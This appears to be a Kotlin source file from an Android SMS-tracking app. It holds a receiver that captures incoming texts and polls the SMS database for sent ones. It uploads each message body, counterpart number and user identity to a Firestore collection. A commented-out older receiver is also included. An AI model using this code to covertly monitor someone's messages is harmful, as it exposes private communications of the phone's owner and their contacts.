package com.example.calltrackinh

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Context.MODE_PRIVATE
import android.content.Intent
import android.content.SharedPreferences
import android.database.ContentObserver
import android.net.Uri
import android.os.Bundle
import android.os.Handler
import android.telephony.SmsMessage
import android.util.Log
import com.google.firebase.firestore.FirebaseFirestore

class SmsReceiver : BroadcastReceiver() {
    private var lastSentSmsId: Long = -1  // Store last logged outgoing SMS ID
    private lateinit var sharedPreferences: SharedPreferences

    override fun onReceive(context: Context, intent: Intent) {
        if (intent.action == "android.provider.Telephony.SMS_RECEIVED") {
            trackIncomingSms(intent,context)
        }
    }

    private fun trackIncomingSms(intent: Intent,context: Context) {
        val bundle: Bundle? = intent.extras
        if (bundle != null) {
            val pdus = bundle["pdus"] as Array<*>
            val messages = pdus.map { SmsMessage.createFromPdu(it as ByteArray) }

            for (message in messages) {
                val sender = message.originatingAddress
                val content = message.messageBody
                insertSmsToFirebase(context,"Incoming",content.toString(),"1",sender)
                logToFirebase("Incoming SMS from $sender: $content")
            }
        }
    }

    fun startOutgoingSmsTracking(context: Context) {
        val handler = Handler()
        val smsObserver = object : ContentObserver(handler) {
            override fun onChange(selfChange: Boolean) {
                super.onChange(selfChange)
                trackOutgoingSms(context)
            }
        }
        context.contentResolver.registerContentObserver(Uri.parse("content://sms/"), true, smsObserver)
    }

    private fun trackOutgoingSms(context: Context) {
        val sharedPreferences = context.getSharedPreferences("SmsTrackerPrefs", Context.MODE_PRIVATE)

        val uri = Uri.parse("content://sms/sent")
        val projection = arrayOf("_id", "address", "body", "date")

        val cursor = context.contentResolver.query(
            uri, projection, null, null, "date DESC LIMIT 1"
        )

        cursor?.use {
            if (it.moveToFirst()) {
                val smsId = it.getLong(it.getColumnIndexOrThrow("_id"))
                val lastSentSmsId = sharedPreferences.getLong("lastSentSmsId", -1)

                Log.d("SmsReceiver", "Fetched SMS ID: $smsId, Last Logged ID: $lastSentSmsId")

                if (smsId != lastSentSmsId) {  // Log only if it's a new SMS
                    sharedPreferences.edit().putLong("lastSentSmsId", smsId).apply()

                    val recipient = it.getString(it.getColumnIndexOrThrow("address"))
                    val message = it.getString(it.getColumnIndexOrThrow("body"))
                    insertSmsToFirebase(context,"Outgoing",message.toString(),"2",recipient)
                    logToFirebase("Outgoing SMS to $recipient: $message")
                } else {

                }
            } else {
                Log.d("SmsReceiver", "No outgoing SMS found in database")
            }
        } ?: Log.d("SmsReceiver", "Cursor is null - Could not access SMS database")
    }

    private fun logToFirebase(message: String) {
        Log.d("SmsReceiver", "Tracking SMS: $message")
    }
}

private fun insertSmsToFirebase(context: Context, smsType: String, msg: String?,type: String,phoneNumber: String?) {
    val userData = getUserDataFromNative(context)
    val db = FirebaseFirestore.getInstance()
    val timestampMillis = System.currentTimeMillis()
    val smsData = mapOf(
        "id" to timestampMillis,
        "userId" to (userData?.get("userId") ?: ""),
        "username" to (userData?.get("username") ?: ""),
        "phoneNumber" to (phoneNumber ?: ""),
        "smsType" to smsType,
        "message" to (msg ?: "Unknown"),
        "type" to type,
        "timestamp" to timestampMillis
    )

    db.collection("sms")
        .document(timestampMillis.toString())
        .set(smsData)
        .addOnSuccessListener {
            println("sms data inserted successfully")
        }
        .addOnFailureListener { e ->
            println("Error inserting call data: ${e.message}")
        }
}



private fun getUserDataFromNative(context: Context): Map<String, String>? {
    val sharedPreferences: SharedPreferences = context.getSharedPreferences("FlutterSharedPrefs", MODE_PRIVATE)
    val userId = sharedPreferences.getString("userId", null)
    val username = sharedPreferences.getString("username", null)

    return if (userId != null && username != null) {
        mapOf("userId" to userId, "username" to username)
    } else {
        null
    }
}




//import android.content.BroadcastReceiver
//import android.content.Context
//import android.content.Intent
//import android.os.Bundle
//import android.telephony.SmsMessage
//
//class SmsReceiver : BroadcastReceiver() {
//    override fun onReceive(context: Context, intent: Intent) {
//        if (intent.action == "android.provider.Telephony.SMS_RECEIVED") {
//            val bundle: Bundle? = intent.extras
//            if (bundle != null) {
//                val pdus = bundle["pdus"] as Array<*>
//                val messages = pdus.map { SmsMessage.createFromPdu(it as ByteArray) }
//
//                for (message in messages) {
//                    val sender = message.originatingAddress
//                    val content = message.messageBody
//                    logToFirebase("SMS from $sender: $content")
//                }
//            }
//        }
//    }
//
//    private fun logToFirebase(message: String) {
//        println("Tracking sms reciver message: $message")
//    }
//}
